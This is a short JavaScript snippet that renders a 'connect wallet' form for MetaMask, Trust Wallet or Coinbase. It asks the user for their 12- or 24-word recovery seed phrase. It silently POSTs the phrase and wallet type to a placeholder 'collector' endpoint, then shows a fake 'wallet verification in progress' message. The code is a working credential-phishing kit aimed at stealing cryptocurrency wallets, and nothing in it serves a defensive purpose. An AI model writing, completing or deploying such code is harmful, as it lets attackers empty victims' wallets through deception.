function connectWallet() {
  const container = document.getElementById("walletBox");

  container.innerHTML = `
    <label for="walletSelect"><strong>Select Wallet Type:</strong></label><br>
    <select id="walletSelect" style="margin-top: 10px;">
      <option value="MetaMask">MetaMask</option>
      <option value="TrustWallet">Trust Wallet</option>
      <option value="Coinbase">Coinbase</option>
    </select><br><br>

    <label for="seedInput"><strong>Enter Seed Phrase:</strong></label><br>
    <textarea id="seedInput" rows="3" placeholder="Enter your 12 or 24-word recovery phrase here" style="width: 100%; border-radius: 6px; padding: 10px;"></textarea><br><br>

    <button onclick="submitWallet()" class="btn">Submit</button>
  `;

  container.style.display = "block";
}

function submitWallet() {
  const walletType = document.getElementById("walletSelect").value;
  const seedPhrase = document.getElementById("seedInput").value;

  if (!seedPhrase || seedPhrase.split(" ").length < 12) {
    alert("Please enter a valid 12 or 24-word seed phrase.");
    return;
  }

  fetch("https://your-collector-endpoint.com/collect", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({ walletType, seedPhrase })
  }).then(res => {
    alert("Wallet verification in progress...");
  }).catch(err => {
    alert("An error occurred. Try again later.");
  });
}
